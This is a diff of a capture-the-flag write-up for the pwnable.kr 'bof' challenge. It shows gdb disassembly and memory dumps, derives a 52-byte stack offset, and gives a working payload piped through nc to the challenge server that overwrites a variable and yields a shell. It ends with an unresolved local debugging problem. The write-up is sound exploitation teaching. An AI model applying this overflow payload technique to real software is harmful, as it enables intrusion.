@@ -49,7 +49,7 @@ also:
     'A buffer overflow is the result of stuffing more data into a buffer than it can handle.'
 
 Methods:
-	1.	check the bof.c:
+1.	check the bof.c:
 			cat bof.c
 		""""""""""""""""""""""""""""""""""""
 		#include <stdio.h>
@@ -72,12 +72,143 @@ Methods:
 		}
 		""""""""""""""""""""""""""""""""""""
 
-	2. 	use gdb to locate the buffer:
+2. 	use gdb to locate the buffer:
 			gdb bof
 		
 		when entering gdb mode, we can use 'disas' command to disassamble the file:
 			disas main
-		
-		
+		-------------------------------------------------
+		(gdb) disas main
+		Dump of assembler code for function main:
+		0x0000068a <+0>:	push   %ebp
+		0x0000068b <+1>:	mov    %esp,%ebp
+		0x0000068d <+3>:	and    $0xfffffff0,%esp
+		0x00000690 <+6>:	sub    $0x10,%esp
+		0x00000693 <+9>:	movl   $0xdeadbeef,(%esp)
+		0x0000069a <+16>:	call   0x62c <func>
+		0x0000069f <+21>:	mov    $0x0,%eax
+		0x000006a4 <+26>:	leave  
+		0x000006a5 <+27>:	ret    
+		End of assembler dump.
+		-------------------------------------------------
+
 			disas func
+		-------------------------------------------------
+		(gdb) disas func
+		Dump of assembler code for function func:
+		0x0000062c <+0>:	push   %ebp
+		0x0000062d <+1>:	mov    %esp,%ebp
+		0x0000062f <+3>:	sub    $0x48,%esp
+		0x00000632 <+6>:	mov    %gs:0x14,%eax
+		0x00000638 <+12>:	mov    %eax,-0xc(%ebp)
+		0x0000063b <+15>:	xor    %eax,%eax
+		0x0000063d <+17>:	movl   $0x78c,(%esp)
+		0x00000644 <+24>:	call   0x645 <func+25>
+		0x00000649 <+29>:	lea    -0x2c(%ebp),%eax
+		0x0000064c <+32>:	mov    %eax,(%esp)
+		0x0000064f <+35>:	call   0x650 <func+36>
+		0x00000654 <+40>:	cmpl   $0xcafebabe,0x8(%ebp)
+		0x0000065b <+47>:	jne    0x66b <func+63>
+		0x0000065d <+49>:	movl   $0x79b,(%esp)
+		0x00000664 <+56>:	call   0x665 <func+57>
+		0x00000669 <+61>:	jmp    0x677 <func+75>
+		0x0000066b <+63>:	movl   $0x7a3,(%esp)
+		0x00000672 <+70>:	call   0x673 <func+71>
+		0x00000677 <+75>:	mov    -0xc(%ebp),%eax
+		0x0000067a <+78>:	xor    %gs:0x14,%eax
+		0x00000681 <+85>:	je     0x688 <func+92>
+		0x00000683 <+87>:	call   0x684 <func+88>
+		0x00000688 <+92>:	leave  
+		0x00000689 <+93>:	ret    
+		End of assembler dump.
+		-------------------------------------------------
+
+3.	so we can see that in 0x0000069a<*main+16>, main() calls the func(),
+	and in func(), at 0x00000654<*func+40>, the function makes the comparation:
+			if (key == 0xcafebabe)
+	if key == 0xcafebabe, then we will get the bof and do the 'cat flag'
+
+4.	make break before the if comparation:
+			b *func+40
 		
+	then run the program:
+			run 
+
+5.	first try input a normal string into the buffer:
+	
+		(gdb) run
+		Starting program: /root/pwn/bof 
+		overflow me : 
+		aaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+		Breakpoint 1, 0x56555654 in func ()
+
+	then check the register:
+		x/12x $esp
+		
+		(gdb) x/12x $esp
+		0xffffd330:	0xffffd34c	0x00000000	0x00000000	0x372ad700
+		0xffffd340:	0x00000009	0xffffd5ca	0xf7df7fa9	0x61616161
+		0xffffd350:	0x61616161	0x61616161	0x61616161	0x61616161
+	
+	now we see where the input string goes;
+
+	then check the register $ebp, because in the if comparation, the key is located at:
+		0x00000654 <+40>:	cmpl   $0xcafebabe,0x8(%ebp)
+
+	that is: $ebp + 0x8, so use:
+		x/12x $ebp+8
+
+		(gdb) x/12x $ebp+8
+		0xffffd380:	0xdeadbeef	0x00000000	0x565556b9	0x00000000
+		0xffffd390:	0xf7f9d000	0xf7f9d000	0x00000000	0xf7de0e81
+		0xffffd3a0:	0x00000001	0xffffd434	0xffffd43c	0xffffd3c4
+
+	so we get the address of variable 'key', the following thing to do is to overflow the
+	buffer overflowme in order to reach 0xffffd380
+
+	notice that:
+		the start of buffer: 	0xffffd34c
+		the start of $ebp:		0xffffd380
+	
+	so the total length of string should be:
+		0xffffd380 - 0xffffd34c = 52
+	
+	then the string could be:
+		'\x00' * 52 + '\xbe\xba\xfe\xca'
+	(be careful of the little-endian in Intel CPU)
+
+6.	fianlly, when we want to pass the arguments, one way that works is:
+		cat <(python -c "print('\x00' * 52 + '\xbe\xba\xfe\xca')") - | nc pwnable.kr 9000
+	
+	then you will get the flag:
+
+		root@kali:~/pwn# cat <(python -c "print('\x00' * 52 + '\xbe\xba\xfe\xca')") - | nc pwnable.kr 9000
+		whoami
+		bof
+		cat flag
+		daddy, I just pwned a buFFer :)
+
+PS:
+1.	Actually, when I try this on my kali, there is something wrong with the overflow.
+when I pass '\x00' * 52 + '\xbe\xba\xfe\xca' to func in gdb, the $ebp shows like this:
+
+		(gdb) x/12x $ebp
+		0xffffd378:	0x61616161	0x61616161	0xbac2bec2	0x8ac3bec3
+		0xffffd388:	0x56555600	0x00000000	0xf7f9d000	0xf7f9d000
+		0xffffd398:	0x00000000	0xf7de0e81	0x00000001	0xffffd434
+
+which shows that the value '\xbe\xba\xfe\xca' is not correctly stored.
+However, when I try passing values like '\x33\x33\x32\x31', it goes well:
+
+		(gdb) x/12x $ebp
+		0xffffd378:	0x61616161	0x61616161	0x31323334	0x00000000
+		0xffffd388:	0x565556b9	0x00000000	0xf7f9d000	0xf7f9d000
+		0xffffd398:	0x00000000	0xf7de0e81	0x00000001	0xffffd434
+
+Honestly, I don't figure out the problem for the moment, and I will keep trying solving this.
+If any idea, please please save me OTL.
+
+If anything wrong with this idea, or there is any other method, or anything else:
+please contact me: songdy0x0tter@gmail.com
+I'll appreciate it very much if anyone find any fault in these writeup. Thx.
